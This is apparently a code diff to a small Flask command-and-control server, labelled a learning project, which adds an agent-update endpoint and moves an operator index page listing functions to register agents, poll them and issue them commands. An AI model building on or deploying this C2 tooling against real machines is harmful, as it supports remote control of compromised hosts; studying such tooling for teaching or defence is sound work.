@@ -50,11 +50,6 @@ print("DB initialized")
 
 app = Flask(__name__)
 
-# Main page with links to all operator functions
-@app.route("/")
-def hello_world():
-    return '<h3>Simple C2 server built for learning purpposes</h3><b>Operator functionalities:</b><br/><a href="/client/agents">List agents</a><br/><a href="/client/agent?id=XXXX">Agent details</a> (supply agent ID)<br/><a href="/client/command?id=XXXX&command=YYYY">Issue command to agent</a> (supply agent ID and command)<br/><a href="/client/agentnote?id=XXXX&note=YYYY">change agent note</a> (supply agent ID and note)<br/><br/><b>Agent functionalities:</b><br/><a href="/agent/register">Register agent</a>(Supply ID or get a random one)<br/><a href="/agent/heartbeat?heartbeat=eyJpZCI6MTAwMH0=">Check-in with heartbeat</a>(Supply a base64-encoded JSON)<br/><a href="/agent/getcommand?id=XXXX">Check for new command</a>(supply agent ID)<br/><a href="/agent/verify/<string:code>">Verify server</a>(Supply a base64-encoded string eg: ZGNiYQ==)<br/>'
-
 # Register new agent
 # TODO: check for duplicates of ID
 @app.route('/agent/register')
@@ -63,12 +58,24 @@ def register():
     ip = request.args.get('ip', default = 'TBD', type = str)
     hostname = request.args.get('hostname', default = 'TBD', type = str)
     sleeptime = request.args.get('sleeptime', default = 3, type = int)
-    note = request.args.get('note', default = '', type = str)
 
     if (id < 1000 or id > 9999):
         id = random.randint(1000, 9999)
-    c.execute("INSERT INTO agents (id, ip, hostname, sleeptime, registered_timestamp, note) VALUES (?,?,?,?,CURRENT_TIMESTAMP, ?)", (id, ip, hostname, sleeptime, note))
+    c.execute("INSERT INTO agents (id, ip, hostname, sleeptime, registered_timestamp, note) VALUES (?,?,?,?,CURRENT_TIMESTAMP,'')", (id, ip, hostname, sleeptime))
     return f"Registered agent with id: {id}"
+
+# Update agent info
+@app.route('/agent/update')
+def update():
+    id = request.args.get('id',default = 0, type = int)
+    ip = request.args.get('ip', default = 'TBD', type = str)
+    hostname = request.args.get('hostname', default = 'TBD', type = str)
+    sleeptime = request.args.get('sleeptime', default = 3, type = int)
+
+    if (id < 1000 or id > 9999):
+        return f"Invalid agent id. Pass id as GET parameter: ?id=XXXX"
+    c.execute("UPDATE agents SET ip=?, hostname=?, sleeptime=? WHERE id = ?", (ip, hostname, sleeptime, id))
+    return f"Updated agent with id: {id}"
 
 
 # Heartbeat function for agent to check-in and (optionally) report command results
@@ -131,7 +138,11 @@ def verify(code):
 ##############
 # API - CLIENT ENDPOINTS
 ##############
-# TODO: make some basic UI?
+
+# Main page with links to all operator functions
+@app.route("/")
+def hello_world():
+    return '<h3>Simple C2 server built for learning purpposes</h3><b>Operator functionalities:</b><br/><a href="/client/agents">List agents</a><br/><a href="/client/agent?id=XXXX">Agent details</a> (supply agent ID)<br/><a href="/client/command?id=XXXX&command=YYYY">Issue command to agent</a> (supply agent ID and command)<br/><a href="/client/agentnote?id=XXXX&note=YYYY">change agent note</a> (supply agent ID and note)<br/><br/><b>Agent functionalities:</b><br/><a href="/agent/register">Register agent</a>(Supply ID or get a random one)<br/><a href="/agent/update">Update agent info</a>(Supply ID)<br/><a href="/agent/heartbeat?heartbeat=eyJpZCI6MTAwMH0=">Check-in with heartbeat</a>(Supply a base64-encoded JSON)<br/><a href="/agent/getcommand?id=XXXX">Check for new command</a>(supply agent ID)<br/><a href="/agent/verify/<string:code>">Verify server</a>(Supply a base64-encoded string eg: ZGNiYQ==)<br/>'
 
 # List all registered agents
 @app.route('/client/agents')
